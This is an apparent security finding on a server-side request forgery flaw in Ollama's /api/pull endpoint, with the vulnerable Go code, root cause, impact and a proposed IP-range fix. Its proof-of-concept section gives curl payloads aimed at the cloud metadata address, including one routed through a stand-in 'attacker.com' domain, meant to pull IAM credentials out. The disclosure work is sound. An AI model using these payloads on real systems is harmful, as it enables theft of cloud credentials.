## Summary

`POST /api/pull` accepts a user-supplied model name whose host component flows directly into an outgoing `GET http://<host>/v2/<ns>/<repo>/manifests/<tag>` request. The host validator `isValidPart(kindHost, s)` permits any run of letters, digits, `.`, `-`, `_`, and `:` — including link-local IPs such as `169.254.169.254` and private ranges. When the caller passes `"insecure":true`, the `http://` protocol scheme is accepted without objection. Response bodies from the SSRF target flow back to the API caller through the error message formatter (`fmt.Errorf("pull model manifest: %s", err)`), where `err` already wraps a body-containing message, enabling credential exfiltration from cloud metadata services (IMDS v1, GCE, Azure IMDS).

## Details

`POST /api/pull` accepts a user-supplied model name whose host component flows directly into an outgoing `GET http://<host>/v2/<ns>/<repo>/manifests/<tag>` request. The host validator `isValidPart(kindHost, s)` permits any run of letters, digits, `.`, `-`, `_`, and `:` — including link-local IPs such as `169.254.169.254` and private ranges. When the caller passes `"insecure":true`, the `http://` protocol scheme is accepted without objection. Response bodies from the SSRF target flow back to the API caller through the error message formatter (`fmt.Errorf("pull model manifest: %s", err)`), where `err` already wraps a body-containing message, enabling credential exfiltration from cloud metadata services (IMDS v1, GCE, Azure IMDS).

### Location

- `server/images.go:615-617` — `if n.ProtocolScheme == "http" && !regOpts.Insecure { return errInsecureProtocol }`
- `server/images.go:853-875` — `pullModelManifest` builds request URL from `n.BaseURL()`
- `server/images.go:864` — `data, err := io.ReadAll(resp.Body)` (also tied to Finding 003)
- `server/images.go:622` — `return fmt.Errorf("pull model manifest: %s", err)` (error body reflection)
- `types/model/name.go:344-372` — `isValidPart` accepts digits + `.` + `:` for `kindHost`

### Attacker Control

Any network client reachable on the ollama API (127.0.0.1:11434 by default; 0.0.0.0:11434 on container / remote-dev installs) controls:
- `name` — free-form hostname+path of outgoing request
- `insecure` — HTTP-scheme opt-in

No authentication required by default. Authentication is only enforced when `OLLAMA_AUTH=1` is set, which is rare in practice.

### Trust Boundary Crossed

External (API client, potentially internet-reachable) → internal network / cloud metadata / loopback services. Bypasses the implicit assumption that outgoing registry requests go to public internet.

### Evidence

```go
// server/images.go:615-622
if n.ProtocolScheme == "http" && !regOpts.Insecure {
    return errInsecureProtocol
}

fn(api.ProgressResponse{Status: "pulling manifest"})

mf, manifestData, err := pullModelManifest(ctx, n, regOpts)
if err != nil {
    return fmt.Errorf("pull model manifest: %s", err)   // reflects body via wrapped err
}

// server/images.go:853-875
func pullModelManifest(ctx context.Context, n model.Name, regOpts *registryOptions) (*manifest.Manifest, []byte, error) {
    requestURL := n.BaseURL().JoinPath("v2", n.DisplayNamespaceModel(), "manifests", n.Tag)
    ...
    resp, err := makeRequestWithRetry(ctx, http.MethodGet, requestURL, headers, nil, regOpts)
    ...
    data, err := io.ReadAll(resp.Body)
    ...
}
```

`isValidPart` host rule:

```go
// types/model/name.go:344-372
func isValidPart(kind partKind, s string) bool {
    ...
    for i := range s {
        if i == 0 { if !isAlphanumericOrUnderscore(s[i]) { return false }; continue }
        switch s[i] {
        case '_', '-':
        case '.':                      // <-- dot allowed
            if kind == kindNamespace { return false }
        case ':':                      // <-- colon allowed (port)
            if kind != kindHost && kind != kindDigest { return false }
        default:
            if !isAlphanumericOrUnderscore(s[i]) { return false }
        }
    }
    return true
}
```

## Root Cause

Validated rationale: isValidPart(kindHost) accepts arbitrary dotted IP/hostnames including 169.254.169.254; Insecure=true allows HTTP; error body is reflected via fmt.Errorf — Advocate confirmed no outbound host allowlist, IMDS block, or private-IP filter.

Primary cited code reference: `server/images.go:615`.

Merge extraction sink line: - `server/images.go:615-617` — `if n.ProtocolScheme == "http" && !regOpts.Insecure { return errInsecureProtocol }`

An adversarial review was preserved alongside the draft and should be consulted for counter-arguments and any severity challenge.

## Proof of Concept

Merge-normalized status: `executed.`.

PoC script present: `poc.py`.

Supporting evidence is present under `evidence/`.

AWS / GCP instance:
```
curl -s -X POST http://127.0.0.1:11434/api/pull \
  -d '{"name":"169.254.169.254/latest/meta-data/iam/security-credentials/default:x","insecure":true}'
```
(The path construction isn't perfectly clean — `n.DisplayNamespaceModel()` prepends `/v2/...` — but the request lands on `169.254.169.254:80/v2/.../manifests/x` which returns the IMDS default index page or similar; the body surfaces in the error message.)

Cleaner PoC via DNS: point `imds.attacker.com` → `169.254.169.254` via NS record, then:
```
curl -s -X POST http://127.0.0.1:11434/api/pull \
  -d '{"name":"imds.attacker.com/metadata:x","insecure":true}'
```

Debate context: Tracer confirmed `isValidPart` allows IP addresses; Advocate searched for and did not find any outbound-host allowlist, `allowedHostsMiddleware` (which only governs incoming Host headers), IMDS blocker, or private-IP rejector. The fix is a DNS resolution + IP-range check before issuing the request.

## Impact

- Read IMDS: `GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → AWS temporary credentials exfiltrated through reflected error body.
- Internal service probing: fingerprint HTTP services on internal subnets via response status and timing.
- SSRF to loopback: reach other services bound to 127.0.0.1 (other ollama instances; admin panels).
- If the ollama API is itself internet-reachable (OLLAMA_HOST=0.0.0.0 in container environments), this SSRF is remote-unauthenticated.

_Synthesized during merge normalization from `archon/findings/H1-api-pull-ssrf/draft.md`._
